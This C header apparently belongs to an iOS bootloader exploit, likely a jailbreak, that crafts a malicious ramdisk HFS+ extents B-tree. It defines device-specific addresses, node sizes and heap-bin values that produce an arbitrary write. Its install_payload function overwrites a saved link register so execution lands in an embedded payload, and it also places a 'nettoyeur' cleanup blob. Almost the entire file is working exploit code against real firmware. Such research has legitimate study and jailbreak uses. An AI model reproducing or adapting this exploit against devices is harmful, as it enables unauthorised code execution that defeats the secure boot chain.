#ifndef TARGET_H
#define TARGET_H

/* boot-ramdisk=/a/b/c/disk.dmg */

/* Node size, tune this s.t. r0 points into our ramdisk */
#define NODE_SIZE 0x80

/* The ramdisks header is loaded into a buffer at this address on the device. */
#define HEADER_BUFFER 0x9ff49d20

/* Points to free space in the header buffer (note there's 0x200 bytes loaded). */
#define HEADER_SAFE_OFF 0x90

/* For some devices (such as the iPhone 4S), this value becomes R0. It must be < TOTAL_NODES and LSB must == 0 (hence why we don't use the base address). */
#define EXTENTS_ROOT_NODE (HEADER_BUFFER + HEADER_SAFE_OFF) - 0x9ff00000

/* The total extent nodes. Must be > EXTENTS_ROOT_NODE. */
#define TOTAL_NODES (0xFFFFF)

/* Haven't had to change these so far */
#define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
#define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)

/* Try this first -- a simple flat BTREE where the exploit is triggered on the first read */
#define FLAT_TREE 0

/* 
 * Copy the root node of the tree and put the exploit trigger in a single record, 
 * allows you to set a boot-ramdisk path and try different initial SPs when the exploit is triggered.
 */
#define COPY_ROOT 1

/* The ramdisks extents file is loaded into a buffer at this address on the device. */
#define EXTENTS_BUFFER 0x9ff4a144

/* The SP when we do our write. */
#define FINAL_SP 0x9ff4a290

/* The LR offset from the SP in memalign */
#define SP_LR_OFFSET 0x18

/* Some bin size which will allow us to exit the memalign loop and trigger our arbritrary write. */
#define SUITABLE_BIN_SIZE 0x91919180

/* Offset for nettoyeur in the catalog file. */
#define SAFE_CATALOG_OFFSET 0x28

/* Offset for our payload in the extents file. */
#define SAFE_EXTENTS_OFFSET 0x28

#define CATALOG_BUF_LEN 0x100
#define EXTENTS_BUF_LEN 0x100

#define NETTOYEUR_CATALOG_LEN (CATALOG_BUF_LEN - SAFE_CATALOG_OFFSET)

#define NETTOYEUR_MAX_LEN (NETTOYEUR_CATALOG_LEN + 0xE)
#define PAYLOAD_MAX_LEN (EXTENTS_BUF_LEN - SAFE_EXTENTS_OFFSET)

static inline void install_payload(uint8_t* buf, uint8_t* header, uint8_t* catalog_file, uint8_t* extents_file) {
    uint8_t nettoyeur[] = {
        #embed "target/nettoyeur.bin"
    };
    uint8_t payload[] = {
        #embed "target/payload.bin"
    };

    if(sizeof(payload) > PAYLOAD_MAX_LEN) {
        printf("ERROR: payload too long, should be no longer than 0x%x (is: 0x%lx)\n", PAYLOAD_MAX_LEN, sizeof(payload));
        exit(0);
    }

    printf("Setting up LR overwrite... ");
    *(uint32_t*)(header + HEADER_SAFE_OFF + 0x4) = SUITABLE_BIN_SIZE >> 5; /* Set the size of the 'bin' to some suitable value that allows the loop to exit (getting to the STR) */
    *(uint32_t*)(header + HEADER_SAFE_OFF + 0x20) = (EXTENTS_BUFFER + SAFE_EXTENTS_OFFSET) | 1; /* This is where we want to set the LR, a pointer into our payload. */
    *(uint32_t*)(header + HEADER_SAFE_OFF + 0x24) = FINAL_SP + SP_LR_OFFSET; /* We write the offset at 0x20 to the address at 0x44, so point 0x24 to the LR. */
    printf("Done\n");

    /* Copy in our exploit payload at the correct offset. */
    printf("Installing payload... ");
    memcpy(extents_file + SAFE_EXTENTS_OFFSET, payload, sizeof(payload));
    printf("Done\n");

    /* Copy nettoyeur to the correct offset. */
    if(sizeof(nettoyeur) > NETTOYEUR_MAX_LEN) {
        printf("ERROR: Nettoyeur too long, should be no longer than 0x%x (is: 0x%lx)\n", NETTOYEUR_MAX_LEN, sizeof(nettoyeur));
        exit(0);
    }

    printf("Installing nettoyeur... ");
    memcpy(catalog_file + SAFE_CATALOG_OFFSET, nettoyeur, (sizeof(nettoyeur) > NETTOYEUR_CATALOG_LEN) ? NETTOYEUR_CATALOG_LEN : sizeof(nettoyeur));

    /* The catalog files buffer is right before the extent file, so if nettoyeur > NETTOYEUR_CATALOG_LEN we put the rest in the extents file. */ 
    if(sizeof(nettoyeur) > NETTOYEUR_CATALOG_LEN) {
        memcpy(extents_file, nettoyeur + NETTOYEUR_CATALOG_LEN, sizeof(nettoyeur) - NETTOYEUR_CATALOG_LEN);
    }
    printf("Done.\n");
}

#endif